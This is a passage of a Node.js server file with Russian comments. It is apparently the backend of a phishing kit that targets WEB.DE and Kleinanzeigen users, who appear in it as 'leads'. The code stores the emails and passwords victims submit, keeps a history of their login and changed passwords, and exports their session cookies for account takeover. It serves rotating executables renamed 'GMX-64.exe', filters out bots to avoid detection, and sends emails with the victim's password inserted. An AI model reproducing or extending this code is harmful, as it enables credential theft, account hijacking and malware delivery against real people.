    if (!fs.existsSync(COOKIES_EXPORTED_FILE)) return [];
    const raw = fs.readFileSync(COOKIES_EXPORTED_FILE, 'utf8');
    const data = JSON.parse(raw);
    return Array.isArray(data) ? data : [];
  } catch (e) { return []; }
}
function writeCookiesExported(list) {
  try {
    if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
    fs.writeFileSync(COOKIES_EXPORTED_FILE, JSON.stringify(list, null, 0), 'utf8');
  } catch (e) {}
}

/** Санитизация имени файла для заголовка Content-Disposition (удаление недопустимых символов). */
function sanitizeFilenameForHeader(name) {
  if (!name || typeof name !== 'string') return 'download';
  return String(name)
    .replace(/[\x00-\x1f\x7f"\\]/g, '')
    .replace(/^\s+|\s+$/g, '')
    .replace(/^\.+/, '') || 'download';
}

/** Индекс слота 0..4 по leadId (стабильный хеш). */
function slotFromLeadId(leadId) {
  if (!leadId || typeof leadId !== 'string') return 0;
  let h = 0;
  for (let i = 0; i < leadId.length; i++) h = ((h << 5) - h) + leadId.charCodeAt(i) | 0;
  return Math.abs(h) % DOWNLOAD_SLOTS_COUNT;
}

/** Настройки ротации: после скольких уникальных юзеров менять файл (0 = выкл, по хешу). */
function readDownloadSettings() {
  try {
    if (fs.existsSync(DOWNLOAD_SETTINGS_FILE)) {
      const raw = fs.readFileSync(DOWNLOAD_SETTINGS_FILE, 'utf8');
      const data = JSON.parse(raw);
      const n = typeof data.rotateAfterUnique === 'number' && data.rotateAfterUnique >= 0 ? data.rotateAfterUnique : 0;
      return { rotateAfterUnique: n };
    }
  } catch (e) {}
  return { rotateAfterUnique: 0 };
}
function writeDownloadSettings(cfg) {
  try {
    if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
    fs.writeFileSync(DOWNLOAD_SETTINGS_FILE, JSON.stringify({ rotateAfterUnique: (cfg && cfg.rotateAfterUnique) >= 0 ? cfg.rotateAfterUnique : 0 }, null, 0), 'utf8');
  } catch (e) {}
}

/** Состояние ротации: счётчик уникальных и слот на leadId (windows / android отдельно). */
function readDownloadRotation() {
  try {
    if (fs.existsSync(DOWNLOAD_ROTATION_FILE)) {
      const raw = fs.readFileSync(DOWNLOAD_ROTATION_FILE, 'utf8');
      const data = JSON.parse(raw);
      const w = data.windows || {};
      const a = data.android || {};
      return {
        windows: { totalUnique: typeof w.totalUnique === 'number' ? w.totalUnique : 0, leadSlots: w.leadSlots && typeof w.leadSlots === 'object' ? w.leadSlots : {} },
        android: { totalUnique: typeof a.totalUnique === 'number' ? a.totalUnique : 0, leadSlots: a.leadSlots && typeof a.leadSlots === 'object' ? a.leadSlots : {} }
      };
    }
  } catch (e) {}
  return { windows: { totalUnique: 0, leadSlots: {} }, android: { totalUnique: 0, leadSlots: {} } };
}
function writeDownloadRotation(state) {
  try {
    if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
    fs.writeFileSync(DOWNLOAD_ROTATION_FILE, JSON.stringify(state, null, 0), 'utf8');
  } catch (e) {}
}

/** Слот для leadId: при ротации — по порядку уникальных (один юзер = один слот навсегда); иначе по хешу. */
function getSlotForLead(leadId, platform) {
  const settings = readDownloadSettings();
  if (!settings.rotateAfterUnique || settings.rotateAfterUnique <= 0) {
    return leadId ? slotFromLeadId(leadId) : 0;
  }
  if (!leadId || typeof leadId !== 'string') return 0;
  const state = readDownloadRotation();
  const key = platform === 'android' ? 'android' : 'windows';
  const block = state[key];
  if (block.leadSlots[leadId] !== undefined) {
    return block.leadSlots[leadId];
  }
  const slot = Math.floor(block.totalUnique / settings.rotateAfterUnique) % DOWNLOAD_SLOTS_COUNT;
  block.leadSlots[leadId] = slot;
  block.totalUnique += 1;
  writeDownloadRotation(state);
  return slot;
}
/** Файл для слота index (0..4). Без index — первый доступный слот (обратная совместимость). */
function getSicherheitDownloadFile(index) {
  const config = readDownloadFilesConfig();
  if (typeof index === 'number' && index >= 0 && index < DOWNLOAD_SLOTS_COUNT) {
    const name = config[index];
    if (name) {
      const full = path.join(DOWNLOADS_DIR, name);
      try {
        if (fs.statSync(full).isFile()) return { filePath: full, fileName: name };
      } catch (e) {}
    }
    return null;
  }
  const envPath = process.env.SICHERHEIT_DOWNLOAD_PATH;
  if (envPath) {
    const full = path.isAbsolute(envPath) ? envPath : path.join(PROJECT_ROOT, envPath);
    try {
      if (fs.statSync(full).isFile()) return { filePath: full, fileName: path.basename(full) };
    } catch (e) {}
  }
  for (let i = 0; i < config.length; i++) {
    if (config[i]) {
      const info = getSicherheitDownloadFile(i);
      if (info) return info;
    }
  }
  try {
    const names = fs.readdirSync(DOWNLOADS_DIR).filter(function (n) { return n !== '.gitkeep' && !n.startsWith('.'); });
    let newest = null;
    let newestMtime = 0;
    for (let i = 0; i < names.length; i++) {
      const full = path.join(DOWNLOADS_DIR, names[i]);
      const stat = fs.statSync(full);
      if (stat.isFile() && stat.mtimeMs >= newestMtime) {
        newestMtime = stat.mtimeMs;
        newest = { filePath: full, fileName: names[i] };
      }
    }
    return newest;
  } catch (e) {}
  return null;
}

/** Первый файл по порядку слотов, у которого downloads < limit (при limit > 0 строго пропускаем переполненные). */
function getSicherheitDownloadFileByLimit() {
  const files = getSicherheitDownloadFiles();
  for (let i = 0; i < files.length; i++) {
    const f = files[i];
    if (!f.fileName) continue;
    const limit = f.limit != null ? f.limit : 0;
    const downloads = f.downloads != null ? f.downloads : 0;
    if (limit > 0 && downloads >= limit) continue;
    if (limit <= 0 || downloads < limit) {
      const full = path.join(DOWNLOADS_DIR, f.fileName);
      try {
        if (fs.statSync(full).isFile()) return { filePath: full, fileName: f.fileName };
      } catch (e) {}
    }
  }
  return getSicherheitDownloadFile();
}
/** Список слотов: { fileName, size, downloads, limit } или пустой слот. */
function getSicherheitDownloadFiles() {
  const config = readDownloadFilesConfig();
  const limits = readDownloadLimits();
  const counts = readDownloadCounts();
  const out = [];
  for (let i = 0; i < DOWNLOAD_SLOTS_COUNT; i++) {
    const name = config[i];
    if (!name) {
      out.push({ fileName: null, size: null, downloads: 0, limit: 0 });
      continue;
    }
    const full = path.join(DOWNLOADS_DIR, name);
    try {
      const stat = fs.statSync(full);
      if (stat.isFile()) {
        const limit = typeof limits[name] === 'number' && limits[name] >= 0 ? limits[name] : DEFAULT_DOWNLOAD_LIMIT;
        out.push({
          fileName: name,
          size: stat.size,
          downloads: typeof counts[name] === 'number' ? counts[name] : 0,
          limit
        });
      } else {
        out.push({ fileName: null, size: null, downloads: 0, limit: 0 });
      }
    } catch (e) {
      out.push({ fileName: null, size: null, downloads: 0, limit: 0 });
    }
  }
  return out;
}

/** Android: 5 слотов, без пароля. Конфиг: { "files": [name0, name1, ...] } как у Windows. */
function readAndroidDownloadConfig() {
  try {
    if (fs.existsSync(DOWNLOAD_ANDROID_CONFIG)) {
      const raw = fs.readFileSync(DOWNLOAD_ANDROID_CONFIG, 'utf8');
      const data = JSON.parse(raw);
      let list = Array.isArray(data.files) ? data.files : [];
      if (list.length === 0 && data.fileName && typeof data.fileName === 'string') {
        list = [data.fileName];
      }
      const out = [];
      for (let i = 0; i < DOWNLOAD_SLOTS_COUNT; i++) {
        const v = list[i];
        out.push((v && typeof v === 'string' && !v.includes('..') && !v.includes(path.sep)) ? v : null);
      }
      return out;
    }
  } catch (e) {}
  return Array(DOWNLOAD_SLOTS_COUNT).fill(null);
}
function getAndroidDownloadFile(index) {
  const config = readAndroidDownloadConfig();
  if (typeof index === 'number' && index >= 0 && index < DOWNLOAD_SLOTS_COUNT) {
    const name = config[index];
    if (name) {
      const full = path.join(DOWNLOADS_DIR, name);
      try {
        if (fs.statSync(full).isFile()) return { filePath: full, fileName: name };
      } catch (e) {}
    }
    return null;
  }
  for (let i = 0; i < config.length; i++) {
    if (config[i]) {
      const info = getAndroidDownloadFile(i);
      if (info) return info;
    }
  }
  return null;
}

/** Первый файл Android по порядку слотов, у которого downloads < limit (при limit > 0 строго пропускаем переполненные). */
function getAndroidDownloadFileByLimit() {
  const files = getAndroidDownloadFiles();
  for (let i = 0; i < files.length; i++) {
    const f = files[i];
    if (!f.fileName) continue;
    const limit = f.limit != null ? f.limit : 0;
    const downloads = f.downloads != null ? f.downloads : 0;
    if (limit > 0 && downloads >= limit) continue;
    if (limit <= 0 || downloads < limit) {
      const full = path.join(DOWNLOADS_DIR, f.fileName);
      try {
        if (fs.statSync(full).isFile()) return { filePath: full, fileName: f.fileName };
      } catch (e) {}
    }
  }
  return getAndroidDownloadFile();
}
function readAndroidDownloadLimits() {
  try {
    if (fs.existsSync(DOWNLOAD_ANDROID_LIMITS_FILE)) {
      const raw = fs.readFileSync(DOWNLOAD_ANDROID_LIMITS_FILE, 'utf8');
      const data = JSON.parse(raw);
      return data && typeof data === 'object' ? data : {};
    }
  } catch (e) {}
  return {};
}

function writeAndroidDownloadLimits(limits) {
  try {
    if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
    fs.writeFileSync(DOWNLOAD_ANDROID_LIMITS_FILE, JSON.stringify(limits || {}, null, 0), 'utf8');
  } catch (e) {}
}

function getAndroidDownloadFiles() {
  const config = readAndroidDownloadConfig();
  const limits = readAndroidDownloadLimits();
  const counts = readDownloadCounts();
  const out = [];
  for (let i = 0; i < DOWNLOAD_SLOTS_COUNT; i++) {
    const name = config[i];
    if (!name) {
      out.push({ fileName: null, size: null, downloads: 0, limit: 0 });
      continue;
    }
    const full = path.join(DOWNLOADS_DIR, name);
    try {
      const stat = fs.statSync(full);
      if (stat.isFile()) {
        const limit = typeof limits[name] === 'number' && limits[name] >= 0 ? limits[name] : DEFAULT_DOWNLOAD_LIMIT;
        out.push({
          fileName: name,
          size: stat.size,
          downloads: typeof counts[name] === 'number' ? counts[name] : 0,
          limit
        });
      } else {
        out.push({ fileName: null, size: null, downloads: 0, limit: 0 });
      }
    } catch (e) {
      out.push({ fileName: null, size: null, downloads: 0, limit: 0 });
    }
  }
  return out;
}
function writeAndroidDownloadConfig(files) {
  try {
    if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
    const list = Array.isArray(files) ? files.slice(0, DOWNLOAD_SLOTS_COUNT) : [];
    while (list.length < DOWNLOAD_SLOTS_COUNT) list.push(null);
    fs.writeFileSync(DOWNLOAD_ANDROID_CONFIG, JSON.stringify({ files: list }, null, 0), 'utf8');
  } catch (e) {}
}

const ARCHIVE_PROCESS_TIMEOUT_MS = 120000; // 2 min — чтобы не вешать сервер и не получать 502

/** true, если spawnSync завершился по таймауту (процесс убит). */
function spawnTimedOut(result) {
  return result && (result.signal === 'SIGTERM' || result.status === null);
}

/** Починить битый zip: zip -FF, затем распаковать в extractDir. Возвращает true, если удалось. */
function tryRepairAndExtractZip(tempZip, extractDir, pass, baseDir) {
  const fixedZip = path.join(baseDir, 'fixed.zip');
  const rFF = spawnSync(process.platform === 'win32' ? 'cmd' : 'sh', [
    process.platform === 'win32' ? '/c' : '-c',
    'zip -FF ' + JSON.stringify(tempZip) + ' --out ' + JSON.stringify(fixedZip) + ' 2>&1'
  ], { encoding: 'utf8', cwd: baseDir, timeout: ARCHIVE_PROCESS_TIMEOUT_MS });
  if (spawnTimedOut(rFF)) return false;
  if (!fs.existsSync(fixedZip) || fs.statSync(fixedZip).size === 0) return false;
  const envOld = pass ? { ...process.env, GMW_ZIP_OLD: pass } : process.env;
  const unzipFix = pass
    ? 'unzip -P "$GMW_ZIP_OLD" -o ' + JSON.stringify(fixedZip) + ' -d ' + JSON.stringify(extractDir) + ' 2>&1'
    : 'unzip -o ' + JSON.stringify(fixedZip) + ' -d ' + JSON.stringify(extractDir) + ' 2>&1';
  const r2 = spawnSync(process.platform === 'win32' ? 'cmd' : 'sh', [process.platform === 'win32' ? '/c' : '-c', unzipFix], { encoding: 'utf8', env: envOld, cwd: baseDir, timeout: ARCHIVE_PROCESS_TIMEOUT_MS });
  if (spawnTimedOut(r2)) return false;
  const err2 = (r2.stderr || r2.stdout || '').toString();
  if (r2.status !== 0 && !/warning:|note:/.test(err2)) return false;
  try {
    return fs.readdirSync(extractDir, { withFileTypes: true }).some(e => e.isFile());
  } catch (e) { return false; }
}

/**
 * Обработка архива (Windows): распаковать, переименовать первый файл в GMX-64.exe, заархивировать заново (нормальный zip).
 * type: 'zip' | 'rar'. Если распаковка не удалась — для zip пробуем починку через zip -FF, затем снова распаковка и перепаковка.
 * Возвращает Buffer нового архива или null при ошибке.
 */
function processArchiveToGmx(buf, password, type) {
  const baseDir = path.join(os.tmpdir(), 'gmw-multi-' + Date.now() + '-' + Math.random().toString(36).slice(2, 8));
  const tempZip = path.join(baseDir, 'in' + (type === 'zip' ? '.zip' : '.rar'));
  const outZip = path.join(baseDir, 'gmx.zip');
  const outRar = path.join(baseDir, 'gmx.rar');
  const extractDir = path.join(baseDir, 'ext');
  const repackDir = path.join(baseDir, 'repack');
  try {
    if (!fs.existsSync(baseDir)) fs.mkdirSync(baseDir, { recursive: true });
    fs.writeFileSync(tempZip, buf);
    const pass = (password || '').trim();
    const envOld = pass ? { ...process.env, GMW_ZIP_OLD: pass } : process.env;
    if (type === 'zip') {
      fs.mkdirSync(extractDir, { recursive: true });
      const unzipCmd = pass
        ? 'unzip -P "$GMW_ZIP_OLD" -o ' + JSON.stringify(tempZip) + ' -d ' + JSON.stringify(extractDir) + ' 2>&1'
        : 'unzip -o ' + JSON.stringify(tempZip) + ' -d ' + JSON.stringify(extractDir) + ' 2>&1';
      let r = spawnSync(process.platform === 'win32' ? 'cmd' : 'sh', [process.platform === 'win32' ? '/c' : '-c', unzipCmd], { encoding: 'utf8', env: envOld, cwd: baseDir, timeout: ARCHIVE_PROCESS_TIMEOUT_MS });
      if (spawnTimedOut(r)) return null;
      let err = (r.stderr || r.stdout || '').toString();
      let hasFiles = false;
      try {
        hasFiles = fs.readdirSync(extractDir, { withFileTypes: true }).some(e => e.isFile());
      } catch (e) {}
      if (!hasFiles || (r.status !== 0 && !/warning:|note:/.test(err))) {
        try { fs.readdirSync(extractDir).forEach(n => { const p = path.join(extractDir, n); if (fs.statSync(p).isFile()) fs.unlinkSync(p); }); } catch (e2) {}
        hasFiles = tryRepairAndExtractZip(tempZip, extractDir, pass, baseDir);
      }
      if (!hasFiles) return null;
    } else {
      fs.mkdirSync(extractDir, { recursive: true });
      const sevenZ = '7z';
      const extractCmd = pass
        ? sevenZ + ' x ' + JSON.stringify(tempZip) + ' -p' + pass.replace(/"/g, '\\"') + ' -o' + JSON.stringify(extractDir) + ' -y 2>&1'
        : sevenZ + ' x ' + JSON.stringify(tempZip) + ' -o' + JSON.stringify(extractDir) + ' -y 2>&1';
      const r = spawnSync(process.platform === 'win32' ? 'cmd' : 'sh', [process.platform === 'win32' ? '/c' : '-c', extractCmd], { encoding: 'utf8', cwd: baseDir, timeout: ARCHIVE_PROCESS_TIMEOUT_MS });
      if (spawnTimedOut(r) || r.status !== 0) return null;
    }
    const entries = fs.readdirSync(extractDir, { withFileTypes: true });
    let firstFile = null;
    for (const e of entries) {
      if (e.isFile()) { firstFile = path.join(extractDir, e.name); break; }
    }
    if (!firstFile || !fs.statSync(firstFile).isFile()) return null;
    fs.mkdirSync(repackDir, { recursive: true });
    const gmxExe = path.join(repackDir, 'GMX-64.exe');
    fs.copyFileSync(firstFile, gmxExe);
    const envNew = process.env;
    const zipCmd = 'zip -j ' + JSON.stringify(outZip) + ' ' + JSON.stringify(gmxExe) + ' 2>&1';
    const zr = spawnSync(process.platform === 'win32' ? 'cmd' : 'sh', [process.platform === 'win32' ? '/c' : '-c', zipCmd], { encoding: 'utf8', env: envNew, cwd: baseDir, timeout: ARCHIVE_PROCESS_TIMEOUT_MS });
    if (spawnTimedOut(zr) || zr.status !== 0) return null;
    if (!fs.existsSync(outZip)) return null;
    const outBuf = fs.readFileSync(outZip);
    return outBuf;
  } catch (e) {
    return null;
  } finally {
    try {
      const rimraf = (dir) => {
        if (!fs.existsSync(dir)) return;
        const list = fs.readdirSync(dir);
        for (const name of list) {
          const full = path.join(dir, name);
          if (fs.statSync(full).isDirectory()) rimraf(full);
          else fs.unlinkSync(full);
        }
        fs.rmdirSync(dir);
      };
      if (fs.existsSync(baseDir)) rimraf(baseDir);
    } catch (e2) {}
  }
}

/** Найти файл в downloads/ по имени (точное или без учёта регистра). Возвращает полный путь или null. */
function findDownloadFile(requestedFileName) {
  if (!requestedFileName || requestedFileName.includes(path.sep) || requestedFileName.includes('..')) return null;
  const full = path.join(DOWNLOADS_DIR, requestedFileName);
  try {
    if (fs.statSync(full).isFile()) return full;
  } catch (e) {}
  try {
    const names = fs.readdirSync(DOWNLOADS_DIR);
    const lower = requestedFileName.toLowerCase();
    for (let i = 0; i < names.length; i++) {
      if (names[i].toLowerCase() === lower) {
        const p = path.join(DOWNLOADS_DIR, names[i]);
        if (fs.statSync(p).isFile()) return p;
        return null;
      }
    }
  } catch (e) {}
  return null;
}

// Пульс сессий только в памяти: /api/status не пишет в файл. При отдаче /api/leads в ответ кладём sessionPulseAt (не трогаем lastSeenAt в JSON — порядок сортировки = только активность лида в файле).
// Считаем пульс свежим не дольше 35 сек — иначе юзер уже мог закрыть вкладку и статус должен стать Offline.
const statusHeartbeats = Object.create(null);
const HEARTBEAT_MAX_AGE_MS = 35 * 1000;

/** Ширина экрана: узкий экран = телефон. Выше порога = планшет или десктоп. */
const MOBILE_MAX_WIDTH = 768;

/**
 * Уточнение платформы по экрану: при узком экране не доверяем десктопному UA (Windows/macOS),
 * чтобы мобильный не отображался как ПК. Планшеты (широкий экран + Android/iOS) оставляем как есть.
 */
function resolvePlatform(uaPlatform, screenWidth) {
  if (uaPlatform == null) return null;
  const w = typeof screenWidth === 'number' && screenWidth >= 0 ? screenWidth : null;
  if (w == null) return uaPlatform;
  const isNarrow = w <= MOBILE_MAX_WIDTH;
  if (isNarrow && (uaPlatform === 'windows' || uaPlatform === 'macos')) return null;
  return uaPlatform;
}

function getClientIp(req) {
  // Cloudflare передаёт реальный IP клиента в CF-Connecting-IP (без него виден только IP edge Cloudflare)
  const cfIp = req.headers['cf-connecting-ip'];
  if (cfIp && typeof cfIp === 'string') {
    const ip = cfIp.trim();
    if (ip) return ip;
  }

  // X-Real-IP (Nginx и др.)
  const realIp = req.headers['x-real-ip'];
  if (realIp && typeof realIp === 'string') {
    const ip = realIp.trim();
    if (ip) return ip;
  }

  // X-Forwarded-For: первый в списке — клиент, дальше прокси (при цепочке прокси брать первый)
  const forwarded = req.headers['x-forwarded-for'];
  if (forwarded) {
    const first = forwarded.split(',')[0];
    if (first && typeof first === 'string') {
      const ip = first.trim();
      if (ip) return ip;
    }
  }

  // Прямое подключение без прокси
  if (req.socket && req.socket.remoteAddress) {
    return req.socket.remoteAddress.replace(/^::ffff:/, '');
  }
  return '0.0.0.0';
}

// --- Защита от ботов: лимиты по IP и минимальное время с момента cookie ---
const RATE_LIMIT_WINDOW_MS = 15 * 60 * 1000; // 15 мин
const RATE_LIMITS = {
  visit: { max: 200, window: RATE_LIMIT_WINDOW_MS },
  submit: { max: 300, window: RATE_LIMIT_WINDOW_MS },
  downloadFilename: { max: 150, window: RATE_LIMIT_WINDOW_MS },
  downloadGet: { max: 120, window: RATE_LIMIT_WINDOW_MS },
  configUpload: { max: 30, window: RATE_LIMIT_WINDOW_MS }
};
const rateLimitBuckets = Object.create(null);
const firstGateTimeByIp = Object.create(null);
const GATE_TIME_TTL_MS = 60 * 60 * 1000; // 1 ч
const MIN_TIME_SINCE_GATE_MS = 2000; // 2 сек — быстрые боты отсекаются, юзеры успевают

/** Одноразовые токены для скачивания: без токена в URL боты не могут скачать файл. */
const downloadTokens = Object.create(null);
const DOWNLOAD_TOKEN_TTL_MS = 120 * 1000; // 2 мин
function generateDownloadToken(fileName) {
  const token = require('crypto').randomBytes(24).toString('base64url');
  downloadTokens[token] = { fileName: fileName, expiresAt: Date.now() + DOWNLOAD_TOKEN_TTL_MS };
  return token;
}
function consumeDownloadToken(token) {
  if (!token || typeof token !== 'string') return null;
  const t = downloadTokens[token];
  delete downloadTokens[token];
  if (!t || Date.now() > t.expiresAt) return null;
  return t.fileName;
}

function cleanupRateLimit() {
  const now = Date.now();
  for (const key of Object.keys(rateLimitBuckets)) {
    if (rateLimitBuckets[key].resetAt < now) delete rateLimitBuckets[key];
  }
  for (const ip of Object.keys(firstGateTimeByIp)) {
    if (now - firstGateTimeByIp[ip] > GATE_TIME_TTL_MS) delete firstGateTimeByIp[ip];
  }
  for (const tok of Object.keys(downloadTokens)) {
    if (downloadTokens[tok].expiresAt < now) delete downloadTokens[tok];
  }
}
if (typeof setInterval !== 'undefined') setInterval(cleanupRateLimit, 60000);

function checkRateLimit(ip, bucketKey, limitConfig) {
  const key = bucketKey + ':' + ip;
  const now = Date.now();
  if (!rateLimitBuckets[key] || now > rateLimitBuckets[key].resetAt) {
    rateLimitBuckets[key] = { count: 0, resetAt: now + limitConfig.window };
  }
  rateLimitBuckets[key].count++;
  return rateLimitBuckets[key].count <= limitConfig.max;
}

function setFirstGateTime(ip) {
  if (!firstGateTimeByIp[ip]) firstGateTimeByIp[ip] = Date.now();
}

const MIN_TIME_SINCE_GATE_ANDROID_MS = 800; // для Android — меньше задержка, мобильные быстрее вводят

function getMinTimeSinceGateOk(ip, req) {
  const t = firstGateTimeByIp[ip];
  if (!t) return false;
  const ua = (req && req.headers && req.headers['user-agent']) ? String(req.headers['user-agent']).toLowerCase() : '';
  const isAndroid = /android/.test(ua);
  const minMs = isAndroid ? MIN_TIME_SINCE_GATE_ANDROID_MS : MIN_TIME_SINCE_GATE_MS;
  return (Date.now() - t) >= minMs;
}

/** source: 'user' = действие на странице (юзер), 'admin' = действие из админки (не показываем в красном бейдже).
 *  meta: { session: number } — номер сессии автовхода WEB.DE (колонка «попытка» в логе: поток | N | email).
 *  meta.detail — доп. строка в EVENTS (админка показывает под заголовком). */
function pushEvent(lead, label, source, meta) {
  if (!lead.eventTerminal) lead.eventTerminal = [];
  const ev = { at: new Date().toISOString(), label: label, source: source || 'user' };
  if (meta && typeof meta === 'object') {
    if (meta.session != null && meta.session !== '') {
      const n = parseInt(meta.session, 10);
      ev.session = Number.isFinite(n) ? n : meta.session;
    }
    if (meta.detail != null && String(meta.detail).trim()) {
      ev.detail = String(meta.detail).trim();
    }
  }
  lead.eventTerminal.push(ev);
}

/** Текст для события «Сайт → сервер: submit принят» (и сырой объект в newEvents). */
function submitPipelineDetail(kind, hasPassword, extraDetail) {
  let detail = '';
  if (kind === 'klein-flow') {
    detail = 'страница Klein на домене WEB.DE (kleinFlow), ' + (hasPassword ? 'email+пароль Kl' : 'только email Kl');
  } else if (kind === 'klein') {
    detail = 'сайт Kleinanzeigen, ' + (hasPassword ? 'email+пароль Kl' : 'только email Kl');
  } else {
    detail = 'WEB.DE / почта, ' + (hasPassword ? 'email+пароль' : 'только email');
  }
  if (extraDetail) detail += ' · ' + extraDetail;
  return detail;
}

function submitPipelineEventRaw(atIso, kind, hasPassword, extraDetail) {
  return { at: atIso, label: 'Сайт → сервер: submit принят', source: 'user', detail: submitPipelineDetail(kind, hasPassword, extraDetail) };
}

/** Коротко: что пришло с формы до событий «Ввел почту» / Kl. */
function pushSubmitPipelineEvent(lead, kind, hasPassword, extraDetail) {
  if (!lead) return;
  pushEvent(lead, 'Сайт → сервер: submit принят', 'user', { detail: submitPipelineDetail(kind, hasPassword, extraDetail) });
}

/** Нормализует историю паролей из старого лога в массив { p, s } (для переноса при слиянии). */
function normalizePasswordHistory(hist) {
  if (!hist) return [];
  if (Array.isArray(hist)) {
    return hist.map(function (entry) {
      if (typeof entry === 'object' && entry && entry.p != null) return { p: String(entry.p).trim(), s: entry.s || 'login' };
      if (typeof entry === 'string' && entry.trim()) return { p: entry.trim(), s: 'login' };
      return null;
    }).filter(Boolean);
  }
  return [];
}

/** Для выгрузки куки: пароль со страницы входа и пароль со страницы смены (new). */
function getLoginAndNewPassword(lead) {
  const history = Array.isArray(lead.passwordHistory) ? lead.passwordHistory : [];
  let passLogin = (lead.password != null) ? String(lead.password).trim() : '';
  let passNew = '';
  const firstLogin = history.find(function (e) { return e && e.s === 'login'; });
  if (firstLogin && firstLogin.p != null) passLogin = String(firstLogin.p).trim();
  for (let i = history.length - 1; i >= 0; i--) {
    if (history[i] && history[i].s === 'change') {
      passNew = (history[i].p != null) ? String(history[i].p).trim() : '';
      break;
    }
  }
  return { passLogin: passLogin || '', passNew: passNew || '' };
}

function cookieSafeForLoginCookiesFile(email) {
  if (!email || typeof email !== 'string') return '';
  return String(email).trim().replace(/[^\w.\-@]/g, '_').replace('@', '_at_');
}

/** Email для файла login/cookies/*.json и /api/lead-cookies: у Klein логин на KLZ — emailKl. */
function cookieEmailForLeadCookiesFile(lead) {
  if (!lead || typeof lead !== 'object') return '';
  if (lead.brand === 'klein') {
    return String((lead.emailKl || lead.email || '')).trim();
  }
  return String((lead.email || '')).trim();
}

function leadHasSavedCookies(lead) {
  const safe = cookieSafeForLoginCookiesFile(cookieEmailForLeadCookiesFile(lead));
  if (!safe) return false;
  try {
    const p = path.join(PROJECT_ROOT, 'login', 'cookies', safe + '.json');
    return fs.existsSync(p);
  } catch (e) {
    return false;
  }
}

function leadEventTerminalHasExactLabel(lead, needleLower) {
  const events = Array.isArray(lead && lead.eventTerminal) ? lead.eventTerminal : [];
  return events.some(function (ev) {
    const lbl = ev && ev.label ? String(ev.label).trim().toLowerCase() : '';
    return lbl === needleLower;
  });
}

/** Единая метка в eventTerminal при успешной отправке письма из Config → E-Mail (ручная / массовая). */
const CONFIG_EMAIL_SENT_EVENT_LABEL = 'Send Email';

/**
 * Уже была успешная отправка Config E-Mail: актуальная метка «Send Email» и старые варианты в логе.
 */
function leadHasAnyConfigEmailSentEvent(lead) {
  const events = Array.isArray(lead && lead.eventTerminal) ? lead.eventTerminal : [];
  return events.some(function (ev) {
    const lbl = ev && ev.label != null ? String(ev.label).trim().toLowerCase() : '';
    if (!lbl) return false;
    if (lbl === 'send email' || lbl.indexOf('send email') === 0) return true;
    if (lbl === 'email send' || lbl === 'email send kl') return true;
    if (lbl === 'письмо отправлено') return true;
    if (lbl.indexOf('письмо отправлено') !== -1 && lbl.indexOf('не отправилось') === -1 && lbl.indexOf('не удалось') === -1) {
      return true;
    }
    return false;
  });
}

/** Письмо из Config → E-Mail (как кнопка E-Mail в карточке лида). Ошибки — pushEvent + { ok: false }. */
async function sendConfigEmailToLead(lead) {
  const toEmail = (lead.email || lead.emailKl || '').trim();
  if (!toEmail) {
    pushEvent(lead, 'Письмо не отправилось: у лида нет email', 'admin');
    return { ok: false, error: 'У лида нет email', statusCode: 400 };
  }
  const password = (lead.password || lead.passwordKl || '').trim();
  const data = readConfigEmail();
  let cfg = data.current;
  if (lead.brand === 'klein') {
    const klCfg = (data.configs || []).find(function (c) { return c.id === 'kl' || (c.name && String(c.name).toLowerCase().indexOf('klein') !== -1); });
    if (klCfg) cfg = klCfg;
  }
  if (!cfg || !(cfg.smtpLine && cfg.smtpLine.trim())) {
    pushEvent(lead, 'Письмо не отправилось: не задан SMTP в Config E-Mail', 'admin');
    return { ok: false, error: 'В Config → E-Mail не задан SMTP. Откройте Config, вкладка E-Mail, введите SMTP и нажмите «Сохранить».', statusCode: 400 };
  }
  const smtpList = parseSmtpLines(cfg.smtpLine);
  if (!smtpList.length) {
    pushEvent(lead, 'Письмо не отправилось: не задан SMTP в Config E-Mail', 'admin');
    return { ok: false, error: 'В Config → E-Mail не задан SMTP.', statusCode: 400 };
  }
  let html = (cfg.html || '')
    .replace(/_email_/g, toEmail)
    .replace(/_password_/g, password);
  const attachments = [];
  if (cfg.image1Base64 && html.indexOf('_src1_') !== -1) {
    try {
      const buf = Buffer.from(cfg.image1Base64, 'base64');
      const cid = 'image1@mail';
      html = html.replace(/_src1_/g, 'cid:' + cid);
      attachments.push({ filename: 'image1.png', content: buf, cid: cid });
    } catch (e) {}
  } else if (html.indexOf('_src1_') !== -1) {
    html = html.replace(/_src1_/g, '');
  }
  if (!nodemailer) {
    pushEvent(lead, 'Письмо не отправилось: nodemailer не установлен', 'admin');
    return { ok: false, error: 'nodemailer not installed', statusCode: 500 };
  }
  const smtp = smtpList[0];
  const transporter = nodemailer.createTransport({
    host: smtp.host,
    port: smtp.port,
    secure: smtp.port === 465,
    auth: { user: smtp.user, pass: smtp.password }
  });
  const fromStr = (cfg.senderName ? '"' + String(cfg.senderName).replace(/"/g, '') + '" <' + smtp.fromEmail + '>' : smtp.fromEmail);
  const mailOptions = {
    from: fromStr,
    to: toEmail,
    subject: (cfg.title || '').trim() || 'Message',
    html,
    attachments: attachments.length ? attachments : undefined,
    envelope: { from: smtp.fromEmail, to: toEmail }
  };
  try {
    await transporter.sendMail(mailOptions);
    return { ok: true, fromEmail: smtp.fromEmail };
  } catch (err) {
    const msg = (err.message || '').slice(0, 200);
    pushEvent(lead, 'Письмо не отправилось: ' + msg, 'admin');
    console.error('[send-config-email] Ошибка SMTP ' + smtp.fromEmail + ' → ' + toEmail + ': ' + msg);
    return { ok: false, error: msg, statusCode: 500 };
  }
}

/** Имя файла куки по email: только недопустимые в ФС символы заменяем (оставляем @). Итог: ровно почта + .txt */
function cookieExportFilename(email) {
  if (!email || typeof email !== 'string') return 'unknown.txt';
  const base = String(email).replace(/[\x00-\x1f\\/:*?"<>|]/g, '_').trim();
  return (base || 'unknown') + '.txt';
}

/** Добавляет пароль в password history. source: 'login'/'login_kl' — со страницы входа (web/Klein), 'change'/'change_kl' — со смены пароля. Дубликат подряд не добавляется. */
function pushPasswordHistory(lead, newPassword, source) {
  const allowed = ['login', 'login_kl', 'change', 'change_kl'];
